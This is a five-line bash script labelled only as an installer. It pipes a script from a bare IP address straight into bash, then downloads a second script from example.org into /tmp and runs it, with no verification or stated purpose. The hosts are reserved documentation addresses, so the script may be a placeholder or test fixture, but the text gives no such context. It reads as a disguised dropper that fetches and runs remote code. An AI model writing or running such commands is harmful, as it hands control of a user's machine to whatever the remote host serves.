#!/usr/bin/env bash
# installer
curl http://203.0.113.5/x.sh | bash
wget -qO /tmp/u.sh https://example.org/u.sh
bash /tmp/u.sh
